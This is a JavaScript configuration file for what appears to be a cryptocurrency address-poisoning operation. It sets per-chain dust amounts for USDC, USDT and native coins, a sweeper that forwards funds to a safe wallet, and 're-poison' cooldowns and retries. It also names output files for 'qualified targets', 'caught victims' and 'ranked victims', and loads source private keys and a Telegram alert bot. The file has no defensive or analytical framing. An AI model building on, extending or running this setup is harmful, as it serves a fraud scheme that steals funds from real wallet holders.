import 'dotenv/config';
import path from 'path';
import { parseUnits, parseEther } from 'viem'; // <-- NEW: Import Viem unit parsers

// --- Human-Readable Dust Config ---
// Fallbacks provided to ensure the script never crashes if .env is missing
const envDustNative = process.env.DUST_NATIVE || '0.0001';
const envDustUSDC = process.env.DUST_USDC || '0.0242';
const envDustUSDT = process.env.DUST_USDT || '0.0242';

// ─── Chain definitions ───
export const CHAINS = {
  ethereum: {
    chainId: 1,
    nativeSymbol: 'ETH',
    rpc: process.env.ETH_RPC_URL || process.env.NODE_RPC_URL,
    tokens: {
      USDC: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',
      USDT: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
      WETH: '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2',
      DAI: '0x6B175474E89094C44Da98b954EedeAC495271d0F',
      WBTC: '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599',
    },
    dust: {
      ETH: parseEther(envDustNative),
      USDC: parseUnits(envDustUSDC, 6),
      USDT: parseUnits(envDustUSDT, 6),
    },
  },
  bsc: {
    chainId: 56,
    nativeSymbol: 'BNB',
    rpc: process.env.BSC_RPC_URL || 'https://bsc-dataseed.binance.org/',
    tokens: {
      USDC: '0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d',
      USDT: '0x55d398326f99059fF775485246999027B3197955',
      WBNB: '0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c',
      DAI: '0x1AF3F329e8BE154074D8769D1FFa4eE058B1DBc3',
      BUSD: '0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56',
    },
    dust: {
      BNB: parseEther(envDustNative),
      USDC: parseUnits(envDustUSDC, 18), // BSC correctly uses 18 decimals now
      USDT: parseUnits(envDustUSDT, 18),
    },
  },
  polygon: {
    chainId: 137,
    nativeSymbol: 'MATIC',
    rpc: process.env.POLYGON_RPC_URL || 'https://polygon-rpc.com/',
    tokens: {
      USDC: '0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174',
      USDC_NATIVE: '0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359',
      USDT: '0xc2132D05D31c914a87C6611C10748AEb04B58e8F',
      WMATIC: '0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270',
      DAI: '0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063',
      WBTC: '0x1bfd67037b42cf73acF2047067bd4F2C47D9BfD6',
    },
    dust: {
      MATIC: parseEther(envDustNative),
      USDC: parseUnits(envDustUSDC, 6),
      USDT: parseUnits(envDustUSDT, 6),
    },
  },
};

// --- File suffix based on chain (all chains get suffix) ---
const chain = process.env.CHAIN || 'ethereum';
const suffix = `_${chain}`;

// --- Helper to safely inject chain suffix into ANY filename from .env ---
function appendChainSuffix(filePath) {
  if (!filePath) return filePath;
  const ext = path.extname(filePath); 
  const base = filePath.slice(0, filePath.length - ext.length); 
  return `${base}${suffix}${ext}`; 
}

export const config = {
  // --- Active chain ---
  chain: chain,

  // --- RPC URLs (legacy) ---
  rpc: {
    observer: process.env.OBSERVER_RPC_URL || process.env.NODE_RPC_URL,
    sweeper: process.env.SWEEPER_RPC_URL || process.env.NODE_RPC_URL,
    duster: process.env.DUSTER_RPC_URL || process.env.NODE_RPC_URL,
    collector: process.env.COLLECTOR_RPC_URL || process.env.NODE_RPC_URL,
  },

  // --- Database ---
  db: {
    user: process.env.DB_USER,
    host: process.env.DB_HOST,
    database: process.env.DB_NAME,
    password: String(process.env.DB_PASSWORD),
    port: process.env.DB_PORT || 5432,
  },

  // --- Clore ---
  clore: {
    apiKey: process.env.CLORE_API_KEY,
    instanceId: process.env.CLORE_INSTANCE_ID,
  },

  // --- Files (chain‑aware and perfectly isolated) ---
  files: {
    vault: appendChainSuffix(process.env.VAULT_FILE || 'vault.txt'),
    qualified: appendChainSuffix(process.env.QUALIFIED_FILE || 'qualified_targets.txt'),
    pending: appendChainSuffix(process.env.PENDING_FILE || 'pending_targets.txt'),
    progress: appendChainSuffix(process.env.PROGRESS_FILE || 'batch_progress.txt'),
    caught: appendChainSuffix(process.env.CAUGHT_FILE || 'caught_victims.txt'),
    rankedAddresses: appendChainSuffix(process.env.RANKED_ADDRESSES_FILE || 'ranked_addresses.txt'),
    rankedDetails: appendChainSuffix(process.env.RANKED_DETAILS_FILE || 'ranked_victims.txt'),
  },

  // --- Dust amounts (legacy fallback) ---
  dust: {
    ETH: parseEther(envDustNative),
    USDC: parseUnits(envDustUSDC, 6),
    USDT: parseUnits(envDustUSDT, 6),
  },

  // --- Gas ---
  gas: {
    maxFeeCapGwei: parseInt(process.env.GAS_MAX_FEE_CAP_GWEI || '200', 10),
    priorityFeeGwei: parseInt(process.env.GAS_PRIORITY_FEE_GWEI || '2', 10),
    feeBuffer: parseFloat(process.env.GAS_FEE_BUFFER || '1.25'),
  },

  // --- Sweeper ---
  sweeper: {
    pollIntervalMs: parseInt(process.env.SWEEPER_POLL_INTERVAL_MS || '5000', 10),
    safeWallet: process.env.SAFE_WALLET_ADDRESS,
  },

  // --- Re-poison ---
  rePoison: {
    cooldownMs: parseInt(process.env.REPOISON_COOLDOWN_MS || '3600000', 10),
    dustRetries: parseInt(process.env.REPOISON_DUST_RETRIES || '2', 10),
    delayBetweenMs: parseInt(process.env.REPOISON_DELAY_MS || '2000', 10),
  },

  // --- Logging ---
  logging: {
    level: process.env.LOG_LEVEL || 'info',
    dir: process.env.LOG_DIR || './logs',
  },

  // --- Telegram ---
  telegram: {
    token: process.env.TELEGRAM_BOT_TOKEN,
    chatId: process.env.TELEGRAM_CHAT_ID,
  },

  // --- Fallback RPC URLs (legacy) ---
  fallbackRpcUrls: process.env.FALLBACK_RPC_URLS ? process.env.FALLBACK_RPC_URLS.split(',') : [],

  // --- Encryption ---
  encryption: {
    password: process.env.VAULT_ENCRYPTION_PASSWORD,
  },

  // --- Helper methods ---
  getChainConfig() {
    const chainName = this.chain;
    const chain = CHAINS[chainName];
    if (!chain) throw new Error(`Unknown chain: ${chainName}`);
    return chain;
  },

  getChainRpc() {
    const chain = this.getChainConfig();
    return chain.rpc || this.rpc.observer;
  },

  getChainTokens() {
    const chain = this.getChainConfig();
    return chain.tokens || this.tokens;
  },

  getChainDust() {
    const chain = this.getChainConfig();
    return chain.dust || this.dust;
  },

  getChainId() {
    return this.getChainConfig().chainId;
  },

  getNativeSymbol() {
    return this.getChainConfig().nativeSymbol;
  },

  getSourcePrivateKey() {
    const chainKey = `SOURCE_PRIVATE_KEY_${this.chain.toUpperCase()}`;
    return process.env[chainKey] || process.env.SOURCE_PRIVATE_KEY;
  },
};